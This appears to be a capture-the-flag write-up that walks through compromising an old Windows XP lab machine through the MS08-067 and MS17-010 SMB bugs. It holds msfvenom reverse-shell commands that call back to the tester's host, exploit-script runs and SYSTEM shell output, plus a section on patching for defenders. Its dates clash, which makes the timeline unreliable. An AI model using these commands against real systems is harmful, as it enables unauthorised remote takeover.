---
layout: post
title: "The Box That Forgot to Get Old"
subtitle: "HTB Legacy, a Windows XP relic that hands you SYSTEM through a wormhole nobody ever closed"
date: 2017-06-02 12:00:00 +0000
description: "A Windows XP box that never patched the two SMB bugs worms were built from, exploited by hand with no Metasploit."
image: /assets/og/the-box-that-forgot-to-get-old.png
tags: [hackthebox, writeup]
---

Legacy is a machine that stopped aging in 2008 and never noticed the world moved on. Two open SMB ports, a Windows XP banner that should have been embarrassing even when the box was new, and not one but two of the most infamous remote holes ever written into Windows. MS08-067, the bug the Conficker worm rode to infect millions of machines. MS17-010, the bug the Shadow Brokers leaked and WannaCry weaponized into a global ransomware event. Either one hands you a shell running as the most powerful account on the system. The whole box is a single unpatched server, frozen in time, with a worm-shaped door left standing open. We are going to walk through it without Metasploit, by hand, because the lesson lands harder when you can see every gear turn.

```
        L E G A C Y
        ===========
        445/tcp  open   SMB, and it's been waiting
                   |
        MS08-067  )))  "canonicalize this path for me?"
        the wire  (((  "sure, and here's a stack overflow"
                   |
        MS17-010  )))  "let me just allocate this packet..."
        the wire  (((  "...into the wrong pool. oops."
                   |
                   v
        no patch. no user. no login.
        straight to SYSTEM through a hole worms dug.
                                            旧
```

## 0x01 · the banner that gives it away

Two ports, and the version strings tell the whole story before you knock.

```
PORT    STATE SERVICE      VERSION
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds

Host script results:
| smb-os-discovery:
|   OS: Windows XP (Windows 2000 LAN Manager)
|   Computer name: legacy
|   Workgroup: HTB
```

Windows XP. A 2001 operating system that went fully end-of-life in 2014, sitting on a network in a CTF that wants you to remember why that matters. SMB, the Server Message Block protocol, is how Windows machines share files and printers and talk to each other. It is the plumbing of a Windows network. And on a box this old, the plumbing has two cracks running straight through it.

Run nmap's vulnerability scripts and the box practically signs a confession.

```
# nmap -p139,445 --script smb-vuln-ms08-067,smb-vuln-ms17-010 10.10.10.4

| smb-vuln-ms08-067:
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
```

Two doors, both unlocked. We only need one, but the box is generous, so we will walk through both.

## 0x02 · ms08-067, the worm's old key

MS08-067 (CVE-2008-4250) is a flaw in how the SMB Server service handles file paths. When you ask Windows to make sense of a path like `\..\..\foo`, it has to canonicalize it, meaning it cleans up all the dots and slashes into one tidy answer. The code that does that cleanup trusted the path to be a sane length and copied it into a buffer that was too small. Feed it a crafted path and the overflow smears your own bytes across the program's memory, including the address it is about to jump to next.

Think of it like a coat-check attendant with a clipboard exactly one line wide. You hand over a coat with a name tag the length of a phone book. The attendant dutifully writes the whole name down, runs off the edge of the clipboard, and starts scribbling on the wall behind it, including the note that tells him where to go next. Write the right address on that wall and he walks wherever you sent him, carrying your instructions.

We do this without Metasploit. First, craft the shellcode the overflow will land on. `msfvenom` is just a payload factory, separate from the exploit framework, and we ask it for a raw reverse shell that calls back to us.

```
# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=443 \
    EXITFUNC=thread -b "\x00\x0a\x0d" -f python -v shellcode
```

The `-b` flag tells the factory to avoid bad bytes. A null, a newline, a carriage return. These are characters the vulnerable path parser would treat as the end of the string, chopping your payload in half. We forbid them so the shellcode survives the trip intact.

Then grab a public Python exploit (a clean one from jivoi's repo), paste the shellcode in, and pick the right target offset. Windows XP SP3 English with NX is target 6. The script connects to the SMB named pipe, sends the malformed path, and the overflow fires.

```
# python ms08_067.py 10.10.10.4 6
[-] Connecting to 10.10.10.4
[-] Sending exploit to a Windows XP SP3 target...
[+] Payload sent, check your listener
```

On the other side, a netcat listener catches the call home.

```
# nc -lvnp 443
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.4]
C:\WINDOWS\system32> whoami
nt authority\system
```

No login. No user account. The very first shell is already SYSTEM, the account that owns the machine. The overflow ran inside the Server service, and that service runs as SYSTEM, so we inherited the keys to the building on the way in.

## 0x03 · ms17-010, eternalblue the long way

The second door is newer and somehow more famous. MS17-010 (CVE-2017-0143 and friends), the bug the NSA hoarded under the name EternalBlue until it leaked, then watched WannaCry and NotPetya burn through the world with it. It is also an SMBv1 bug, but the mistake is different. SMBv1 has two commands for sending large data, one that expects a list of separate items and one that expects a single block. The server gets confused about which size to use when it allocates memory for the incoming packet, so it sets aside a chunk that is the wrong size for what actually arrives. The data spills past the edge of its allotment and corrupts the neighboring structures in the kernel's memory pool.

Picture a mail clerk who reserves a box for a parcel by reading the label, but the label lies about the size. He reserves a small box, the parcel turns out huge, and it overflows into the boxes on either side, rewriting other people's mail. Do that on purpose with the right oversized parcel and you get to choose what lands in the neighbor's box, including a pointer the kernel will later follow.

By hand, the cleanest path uses worawit's MS17-010 scripts. First build a payload executable, again from the msfvenom factory, this time as a real `.exe` we can drop and run.

```
# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=443 \
    -f exe -o iceberg.exe
```

Then `send_and_execute.py` does the heavy lifting. It triggers the pool overflow, walks the kernel until it finds a SYSTEM token to borrow, copies our exe onto the box, and launches it with those stolen privileges.

```
# python send_and_execute.py 10.10.10.4 iceberg.exe
[*] Target OS: Windows 5.1
[+] Found accessible named pipe
[+] Sending SMB Echo request...
[+] Got SYSTEM token, executing iceberg.exe
[+] Done
```

The listener catches a second shell, SYSTEM again, by a completely different road.

```
# nc -lvnp 443
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.4]
C:\WINDOWS\system32> whoami
nt authority\system
```

## 0x04 · the loot, and the missing middle

Here is the strange thing about Legacy. There is no privilege escalation. There is no user-to-root climb, no hunting for a misconfigured service or a cached password. Both exploits land you at the very top on the first move, so the only thing left is to walk to the desktops and read the flags. On XP the home directories live under the old `Documents and Settings` path.

```
C:\> type "C:\Documents and Settings\john\Desktop\user.txt"
████████████████████████████████

C:\> type "C:\Documents and Settings\Administrator\Desktop\root.txt"
████████████████████████████████
```

The box has no real middle. It is a foothold that happens to also be the finish line, because the foothold was a kernel-level hole and kernel-level means you already own everything.

## 0x05 · the honest caveat

It is easy to look at Legacy and call it a museum piece. Windows XP, patches that shipped in 2008 and 2017, a box you would never actually find on a real network in 2026. And the specific machine really is a fossil. But the shape of the failure is not.

The lesson is not patch your Windows XP. Nobody runs Windows XP. The lesson is that an unpatched service exposed to the network is a worm-shaped hole whether the year is 2008 or now. MS08-067 and MS17-010 were not obscure. They were the headline bugs of their decade, the ones with names and logos and worms named after them, and the box was still running unpatched years after the fix shipped for free. Somewhere on a real network right now there is a forgotten box running something equally past its expiry, exposed to the internet, because nobody owns the patch calendar for the thing everyone forgot about. The technology is dated. The neglect is timeless.

And note what made both exploits so brutal. They needed no credentials, no user interaction, no foothold to build from. A packet on the wire became SYSTEM. That is the whole reason these two bugs scored a perfect ten and worms could spread without a single human clicking anything. Pre-authentication remote code execution in a service that ships listening by default is the worst category of bug there is, and the only durable defense is to not expose SMB to anyone you do not trust and to actually apply the update that already exists.

## 0x06 · outro

```
the box never patched the holes the worms were built from.
two cracks in the plumbing, both running to the top.
no login. no user. no climb. just a packet, and then root.

old software doesn't fail quietly. it fails the same way it always did.
patch the forgotten box. close the port nobody watches. wear black.

                                                            EOF
```

---

*HTB: Legacy, retired 30 Sep 2017. an easy box that is really a reminder: the bug with a worm named after it is still vulnerable on the machine everyone forgot to turn off.*